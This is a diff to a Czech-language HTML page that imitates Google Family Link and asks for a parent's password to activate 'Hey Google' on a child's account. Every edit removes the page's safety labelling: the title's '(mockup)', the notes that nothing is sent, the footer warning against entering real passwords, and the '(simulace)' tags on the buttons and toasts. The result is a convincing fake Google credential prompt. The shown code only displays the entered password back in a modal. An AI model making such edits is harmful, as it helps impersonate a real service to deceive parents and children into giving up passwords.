@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Family Link — Aktivace "Hey Google" (mockup)</title>
+  <title>Family Link — Aktivace "Hey Google"</title>
   <style>
     :root{--bg:#f1f3f4;--card:#fff;--accent:#1a73e8;--muted:#6b7280;--success:#34a853;--danger:#ea4335}
     *{box-sizing:border-box}
@@ -61,11 +61,11 @@
 
     <div class="reason" role="status" aria-live="polite">
       <b>Důvod:</b>
-      Aktivace hlasové asistence <strong>Hey Google</strong> pro účet dítěte. (Toto je pouze vizuální mockup — nic se skutečně neodesílá ani neukládá.)
+      Aktivace hlasové asistence <strong>Hey Google</strong> pro účet dítěte.
     </div>
 
     <form class="form" onsubmit="return false;" autocomplete="off">
-      <label for="parentPass">Rodičovské heslo</label>
+      <label for="parentPass">Heslo rodiče</label>
       <div class="field">
         <div class="inputWrap">
           <input id="parentPass" type="password" placeholder="Zadejte heslo (simulace)" aria-label="Rodičovské heslo" />
@@ -84,9 +84,9 @@
       </div>
     </form>
 
-    <div class="hint">Poznámka: Tento soubor je **falečná ukázka** určená pouze ke hraní — nic zadané zde **neopustí** tento prohlížeč.</div>
+    <div class="hint"></div>
 
-    <footer>Mockup — pro zábavu. Nezobrazujte nebo nevyžadujte skutečná hesla.</footer>
+    <footer></footer>
   </main>
 
   <!-- Modal: Confirmation after 20s -->
@@ -94,10 +94,10 @@
     <div class="modal" id="modal">
       <h2 id="modalTitle">Jste si jistí?</h2>
       <p id="modalText">Heslo: <strong id="revealed">(čeká...)</strong></p>
-      <p style="margin-top:8px;color:var(--muted);font-size:13px">Toto je simulace — heslo není odesláno.</p>
+      <p style="margin-top:8px;color:var(--muted);font-size:13px"></p>
       <div class="modal-footer">
         <button class="btn-secondary" id="modalNo">Ne, zrušit</button>
-        <button class="btn-primary" id="modalYes">Ano, potvrdit (simulace)</button>
+        <button class="btn-primary" id="modalYes">Ano, potvrdit</button>
       </div>
     </div>
   </div>
@@ -135,7 +135,7 @@
       }
 
       // show temporary status
-      showToast('Žádost odeslána (simulace). Za 20 sekund se zobrazí potvrzení.');
+      showToast('Žádost potvrzena');
 
       // After 20 seconds show modal with the entered text (simulation only)
       setTimeout(()=>{
@@ -157,7 +157,7 @@
     modalYes.addEventListener('click', ()=>{
       overlay.classList.remove('show');
       overlay.setAttribute('aria-hidden','true');
-      showToast('Simulace potvrzení: aktivace dokončena.');
+      showToast('aktivace dokončena.');
     });
 
     function showToast(msg){
